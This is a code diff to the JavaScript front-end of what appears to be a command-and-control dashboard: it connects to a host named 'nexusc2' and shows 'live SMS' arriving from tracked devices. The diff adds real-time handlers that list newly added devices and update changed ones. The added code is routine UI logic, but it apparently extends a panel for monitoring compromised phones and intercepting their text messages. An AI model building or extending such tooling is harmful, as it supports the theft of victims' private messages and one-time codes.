@@ -5296,6 +5296,30 @@ function openAddDbDrawer() {
         const socket = io('https://api.nexusc2.dpdns.org', {
             transports: ['websocket']
         });
+
+        socket.on('deviceAdded', (payload) => {
+            if (!payload || !payload.deviceId || !payload.srcKey || !payload.data) return;
+            const targetDevId = payload.deviceId.toLowerCase();
+            const existing = devices.find(d => d._id.toLowerCase() === targetDevId && d._src === payload.srcKey);
+            if (!existing) {
+                const newDev = { ...payload.data, _id: payload.deviceId, _src: payload.srcKey };
+                devices.push(newDev);
+                debouncedFilterDevs();
+            }
+        });
+
+        socket.on('deviceChanged', (payload) => {
+            if (!payload || !payload.deviceId || !payload.srcKey || !payload.data) return;
+            const targetDevId = payload.deviceId.toLowerCase();
+            const existing = devices.find(d => d._id.toLowerCase() === targetDevId && d._src === payload.srcKey);
+            if (existing) {
+                Object.assign(existing, payload.data);
+                debouncedFilterDevs();
+                if (selDev && selDev._id === existing._id && selDev._src === existing._src) {
+                    renderDetails(existing);
+                }
+            }
+        });
         socket.on('newMessage', (msg) => {
             console.log('[Socket] Live SMS arrived:', msg);
             if (!msg || !msg.deviceId) return;
